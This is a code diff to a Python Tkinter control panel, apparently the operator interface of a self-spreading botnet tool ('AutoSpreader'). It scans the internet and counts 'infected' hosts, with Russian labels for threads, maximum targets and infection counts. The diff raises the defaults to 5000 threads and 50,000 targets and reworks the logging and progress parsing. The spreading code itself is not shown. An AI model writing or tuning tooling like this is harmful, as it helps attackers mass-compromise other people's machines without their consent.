@@ -10,6 +10,7 @@ class BotScanTab(tk.Frame):
         super().__init__(parent)
         self.spreader = AutoSpreader()
         self.scanning = False
+        self.last_stats_update = 0
         self.build_ui()
 
     def build_ui(self):
@@ -23,12 +24,12 @@ class BotScanTab(tk.Frame):
         ttk.Label(settings_frame, text="Потоков:").grid(row=1, column=0, padx=5, sticky=tk.W)
         self.scan_threads = ttk.Entry(settings_frame, width=10)
         self.scan_threads.grid(row=1, column=1, padx=5, sticky=tk.W)
-        self.scan_threads.insert(0, "2000")
+        self.scan_threads.insert(0, "5000")
         add_copy_paste_support(self.scan_threads)
         ttk.Label(settings_frame, text="Макс. целей:").grid(row=2, column=0, padx=5, sticky=tk.W)
         self.max_targets_entry = ttk.Entry(settings_frame, width=10)
         self.max_targets_entry.grid(row=2, column=1, padx=5, sticky=tk.W)
-        self.max_targets_entry.insert(0, "5000")
+        self.max_targets_entry.insert(0, "50000")
         add_copy_paste_support(self.max_targets_entry)
         
         btn_frame = ttk.Frame(self)
@@ -69,14 +70,12 @@ class BotScanTab(tk.Frame):
         
         self.process_messages()
 
-    def log_to_scan(self, message, ip=None):
-        if ip:
-            self.current_ip_var.set(f"Текущий IP: {ip}")
+    def log_to_scan(self, message):
         tag = 'info'
         lower = message.lower()
-        if 'заражён' in lower or 'infected' in lower or 'success' in lower:
+        if 'заражён' in lower or 'infected' in lower:
             tag = 'success'
-        elif 'fail' in lower or 'error' in lower or 'ошибка' in lower:
+        elif 'fail' in lower or 'error' in lower:
             tag = 'error'
         elif 'warning' in lower:
             tag = 'warning'
@@ -125,10 +124,7 @@ class BotScanTab(tk.Frame):
         try:
             while True:
                 msg = self.spreader.message_queue.get_nowait()
-                if msg.startswith("[IP]"):
-                    ip = msg[4:].strip()
-                    self.log_to_scan(f"Сканируется {ip}", ip=ip)
-                elif msg.startswith("[Stats]") or msg.startswith("[Live]") or msg.startswith("[Scan]"):
+                if msg.startswith("[Stats]") or msg.startswith("[Live]") or msg.startswith("[Scan]"):
                     parts = msg.split(',')
                     scanned = None
                     infected = None
@@ -146,20 +142,18 @@ class BotScanTab(tk.Frame):
                         pct = int(msg.split("(")[1].split("%")[0])
                         self.progress_var.set(pct)
                     except: pass
-                elif msg == "[System] Стоп. Заражено:":
-                    self.set_scanning_state(False)
+                elif msg.startswith("[Ports]"):
                     self.log_to_scan(msg)
                 else:
                     self.log_to_scan(msg)
         except queue.Empty:
             pass
-        self.after(100, self.process_messages)
+        self.after(500, self.process_messages)
 
     def scan_internet(self):
         self.spreader.stop()
         self.spreader.load_settings("avz_settings.json")
         self.spreader.worker_threads = int(self.scan_threads.get())
-        self.spreader.interval = 0
         self.spreader.max_targets = int(self.max_targets_entry.get())
         self.progress_var.set(0)
         self.update_stats_display(scanned=0, infected=0)
